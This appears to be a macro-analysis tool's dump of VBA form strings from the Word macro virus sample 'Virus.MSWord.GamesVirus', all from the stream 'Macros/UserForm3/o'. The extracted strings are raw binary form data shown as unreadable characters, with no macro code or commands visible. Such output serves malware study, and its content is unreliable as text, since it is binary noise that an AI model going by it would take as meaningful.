-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������s����t����t���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WWMWWMMF/uMFBQLL3BFIB/5GGKK/F+UBL+QLQm�]H<S����+OR�[J%=[��\OO�Fjfdd���\.8<OKOimVVm+KNVW���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����WVPM3M(IF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������y��s�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����of���t�}�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����W��������t���s����t��t�����tt����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MMMMMMtM3W/PMPP*+mWVBW3m33FLKL++BBBB+LKNOO;OO;%%.;JJ6=6666====<NGL95JO;<;NALQK5QBm/+Uy��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tF//B9+BM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���鶅����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������t������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������MMMMWWMMMM�M�MMM3W333333MMM333B++L+L+LLLLLBBB++B/)/3V333Q++B++L+B)33W3WMWW3q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����MMW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qWtt��t��ttttttttt��t�tt�����������tt�t�����������������������tt�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZYQQZ����Y������Z��yy�yyyy�Z����jZy������q�qq�yy���y��jjZZZyyo�oq�q������q��ӥ������q�W海����榦�����槬q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����yy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q���t��t�t�������q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�t��M�����������W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ut�����t������t�t��tt�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v\\hhll`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r``l`h`l`lls��壌��������~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�����������ԨԺ���夻��ezkkb_R_����ӥ�����Ӧ��Ը����쫤ͧӨ����Ԧ��Ը��������W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tt��nwn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ncn����n��wwntWnnwsyw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tutttutu�wn�}twy�Wt�nutnw��w�o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nwwW���t��t�tt�tt����������t�t����EE�tt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ucccc\\[]hghg`~lll`~sl�~�����������������������������Ө��Ө����}��}bk}����o��ӧ�����������䤤������oo�������QZ/yo���W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tu��tuj��M�n�d���w���c�s��ony�����tt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tt��qu�ts�n�t��utjftWt���sZv����d��n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tt�t��tt��tt�tt���t��t����EE�ttt���t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ywffff\\chhihllg`ggr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`r������������}�����o�ooq���yqq�q������qqq�oomZjyo�y���o�ͬ�����ӨӸ����Ÿ��嫌��}s�����dh���W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tu���������n�d�dfn������s�ow��uwa�t�v��ut��nftMa�~tt��W�j�nc���`�������qn�y���E����t�t�Ett���ttt���������t��tt�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y\i\cccfcf\fc\\iiglll`l~~�����������a���yoqoo�Z�||��qqu��������ttqy�my�Vu�o�q���������Ӧ��to���۷������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tuts��w������d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fnQ���t�����Z���}�ttttttt�����t�y�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���fy����������ob����d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�t�tMtttttttMt�t��������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ad[[gl[ii\cf\\ff\di[sisl`�`~�~e�ez�}��ZZ�yqVoy�����||y�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tmZ||YU�jjoooqu��Ӹ�����ӻ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ӧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�����t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Mttttttuutttttttt��tututttt�tt�ttt�MEEttt�����Et��Et���E�Et��t��E����E�t���������t�����EE������������������������t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ywwcviihh[i\cf\c\c\\iiihl`~~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~~�~reza}_U�ooyp��r~~~��jZtt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�ZUa�{{�pp|qqu���ԸӬ���ӅWn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Өq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����t��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����tttM�tttttttMt�tt�ttttt��tttt���������t������t�����t���������ttttt��������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
awwfffiTTT]]gh\fcfffcciisl~~~sl�hh~~zbkYmmp����g�v�{{kmyu�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tm|�a~��sl~{|�o������ӧ�Ӭ��������q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����tWqqqqqqqqqWWuWWWVooqqqqWWWuWqWqqqqWWuWWuWWWWWWWq3qWWWWWuttWWWuutuuutuuuuuWWWWWWWWWqWWWWWWWWutuuuuuWttMMMMttu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
affnnwwndgrHr]``[cfffffcdill�s�vdddilk__YU�z��~��v�n�cv{pmu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o}a{v�vcnvv~e�������Ԭq秧�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ot�uttt�ttt�yuutt����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������WqqqWWqWWqqqWWuuWWWtWWWWqWWuuuuWuuuWWWWqW3qWqWqqWuuuuuttWtWW�WWWWWWWWWWqqqWWuuWWWWutuuuuuuuuuuuWuuutuuuut
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ywn���ncvwcdi``[idcfffffffcwdhhl\nc\\hl`^a~�����f��ffwdlbr}|�Y`{vvvcf��ww������������ӹ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�s�����e�������~~���Ө�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tWqWquuuuWtM�tt�ttttuWWWWWWWqWqqqqqqWWWWWWuuuuutuutWWWWWWWWqqWWWWWWWWqWWWWWWuWWWWqqqWWWWWWWWWWWWWWWWW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a\cff����cccncTh]ii\wfffffffcncddcnff\cig���堡�����ffwvkh�}a��dicfff���w���������ӧԨ��n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ss���쌩줺�ǹ����ӨԺo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���MtttWWWWtMuWtttWttuW�WWWWWuWWWWWWWWuuuutWuWWutuuuWWWWWWW�WuWWWWWWWWWWqWWWWWqWWqqqqqqqqqqWWWuuutuW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yis[\n������dcwcdddddnffffffffcwvvcwfffcd��Ԥ�����fff�ng}�m�Voprvwf�������������ԧ���ӥ������s����R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ө������ӫW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yZ�yoq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tuttttuuuutuuWWWWWWuuuWWWWWWWWtut�tuuuWqWWqqqWWWWWWWWWWWWqWW3WqqqqqqVqqqqq3qqWWWWWWWWW333WWWqW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�dvdddcf����fvcccciiddcffffffffcdcvcffffn�����ffff�fffd`k}YY�_ifff�fff����򥡩������Ө�qq��f�����DS����������W��ӹ�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q~������t�q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tWqWWWWWWWWuWuuuWWWWqWWutttutWWuWWWWuWuWqqqqWqqqqqWW3WqqWWqWqqq3qqqqWWqWqWWWWWqqWqqqqWWWWWW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cd�n�n\iin����fwcfcncnddffffffffffcdcffff���wfffff�ffclgka_k{dfffffff�f���Լ�����帨�~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��幹�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DQ�Ө����t�qo���W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~~o��us�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tWtutuWWttuWtuWu�ttuutuWWWWqWWWWWWWqqqqqWqWWWWqWWWWWWWWWqqqqqoqoomooVqqqWVVVVVVV3VqVqqqq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
afwcddwnnnfwn������wcffwfwcfffffffffcvvcwf�����fwwffffwvvv{���d�ff�fffff����蠼�����幩�}�������ZW�ӧ������黟���q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y~~y�����酅�ũ���q���൝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Wt�tttttWWWWWWWWuWWWWWWWWWWWW3qooqooomyoyoomomommmmooVqVVVq3qqqqqVqoqqqoVVVooommmmoo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�nwwwcddwwnnfff�������nwffffffffcffffcd�dw���vv��������yq�����v�����������ԉv�s�������YQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������Z������鵵�����q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�~u���������ą�ɁV��e�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��MMtuuuWWtWWWWWWWWqqqqqqqooommm/yZ/yymmmVVqVqV3qVVq33qqqqqooooooomommoommmommmmyyy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����fwcdvcffwwwwff�����ffff�ffwffffffwcdw��������������������婼�������������������ӈ�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������HR��}��醳o�����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�Z����������ϴS:C��ooww
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��EtWq3qqqqqVqomoooomyymymoyyomooooqqqVqqqoooooVooooooooooooooyyymymmmmymyym//yy/y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wffffnffffwfw�f�ffnnf����fwwfwwfwfffffccd�|����i�g{Y}}��o�|���a{{vv�g{a���o������ӧ�Ө����o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������Z��u��秶������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ysuq�Ѫ����������̬cu�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tqVommm//m/yyommommooqoqqqqoqoVoommmmyyymyyyy/yymm//y/mm/myyyZZZZyyZZZZZyZyyyy
-------------------------------------------------------------------------------
